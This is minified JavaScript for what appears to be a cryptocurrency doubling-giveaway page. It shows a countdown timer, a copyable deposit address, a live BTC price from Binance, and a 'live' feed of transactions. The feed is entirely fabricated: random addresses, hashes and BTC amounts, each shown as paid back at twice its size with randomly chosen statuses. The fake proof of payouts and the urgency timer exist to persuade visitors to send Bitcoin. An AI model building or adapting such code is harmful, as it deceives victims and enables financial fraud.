(function () {
  const t = document.createElement("link").relList;
  if (t && t.supports && t.supports("modulepreload")) return;
  for (const n of document.querySelectorAll('link[rel="modulepreload"]')) r(n);
  new MutationObserver((n) => {
    for (const s of n)
      if (s.type === "childList")
        for (const a of s.addedNodes)
          a.tagName === "LINK" && a.rel === "modulepreload" && r(a);
  }).observe(document, { childList: !0, subtree: !0 });
  function o(n) {
    const s = {};
    return (
      n.integrity && (s.integrity = n.integrity),
      n.referrerPolicy && (s.referrerPolicy = n.referrerPolicy),
      n.crossOrigin === "use-credentials"
        ? (s.credentials = "include")
        : n.crossOrigin === "anonymous"
        ? (s.credentials = "omit")
        : (s.credentials = "same-origin"),
      s
    );
  }
  function r(n) {
    if (n.ep) return;
    n.ep = !0;
    const s = o(n);
    fetch(n.href, s);
  }
})();
function u(e, t) {
  return Math.floor(Math.random() * (t - e + 1)) + e;
}
function v() {
  const e = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  let o = "1";
  for (let r = 1; r < 16; r++) {
    const n = u(0, e.length - 1);
    o += e[n];
  }
  return o + "...";
}
$(".qr-item>span").on("click", function () {
  $(".qr-fill").toggleClass("active"), $(this).toggleClass("active");
});
const h = (e, t) => {
  $(`.item.${t}`).removeClass("active"), $(`.item.${e}`).addClass("active");
};
function g(e, t) {
  let o = localStorage.getItem("countdownTime") || e * 60 + t;
  const r = () => {
    const s = Math.floor(o / 60),
      a = o % 60,
      f = s < 10 ? `0${s}` : s,
      p = a < 10 ? `0${a}` : a;
    $(".time > p").text(`${f}:${p}`),
      localStorage.setItem("countdownTime", o),
      o <= 0
        ? (clearInterval(n), localStorage.removeItem("countdownTime"))
        : o--;
  };
  r();
  const n = setInterval(r, 1e3);
}
let i = !1;
$(".swine").on("click", function () {
  this.dataset.next == "item-c" &&
    !i &&
    ((i = !0), g(timedata.min, timedata.sec)),
    h(this.dataset.next, this.dataset.current);
});
function C() {
  const e = "0123456789abcdef";
  let o = "";
  for (let r = 0; r < 15; r++) {
    const n = u(0, e.length - 1);
    o += e[n];
  }
  return (o + "...").toUpperCase();
}
function y(e, t) {
  return (Math.random() * (t - e) + e).toFixed(2);
}
function c(e) {
  return e.toLocaleString("en-US");
}
function b(e) {
  const t = Math.random();
  return t < 0.7 && e > 0.02
    ? { cl: "status-a", nm: "Complete" }
    : t < 0.9 && e < 0.02
    ? { cl: "status-b", nm: "Canceled" }
    : { cl: "status-c", nm: "In progress" };
}
function w() {
  const e = y(0.01, 4);
  console.log(e);
  const t = e * 2,
    o = b(e);
  return `<div class=item-live><div class=item><p>${C()}</div><div class='item fite'><p>${v()}</div><div class=item><p>${c(
    e
  )} BTC</div><div class='item fite lw'><p>${c(
    o.cl == "status-b" ? e : t
  )} BTC</div><div class="item ${o.cl}"><p>${o.nm}</div></div>`;
}
function m() {
  $(".body-live").prepend(w()), setTimeout(m, x(4e3, 1e4));
}
m();
function x(e, t) {
  return Math.floor(Math.random() * (t - e + 1) + e);
}
const I = (e) => {
  if (navigator.clipboard) navigator.clipboard.writeText(e);
  else {
    const t = document.createElement("textarea");
    (t.value = e),
      document.body.appendChild(t),
      t.select(),
      document.execCommand("copy"),
      document.body.removeChild(t);
  }
};
let l;
$(".copy").on("click", function () {
  clearTimeout(l),
    I($(".cp-tx").text()),
    $(".notif").addClass("active"),
    (l = setTimeout(() => {
      $(".notif").removeClass("active");
    }, 2e3));
});
let S = new WebSocket("wss://stream.binance.com:9443/ws/btcusdt@ticker"),
  d = !0;
S.onmessage = (e) => {
  d && ((d = !1), $(".current").removeClass("wait"));
  let t = JSON.parse(e.data),
    o = t.P,
    r = t.c;
  o.includes("-")
    ? $(".current>span").addClass("dec")
    : $(".current>span").removeClass("dec"),
    $(".current>span>span").text(parseFloat(o).toFixed(2)),
    $(".current>p>span").text(parseFloat(r).toFixed(2));
};
$(".vis").fadeOut();
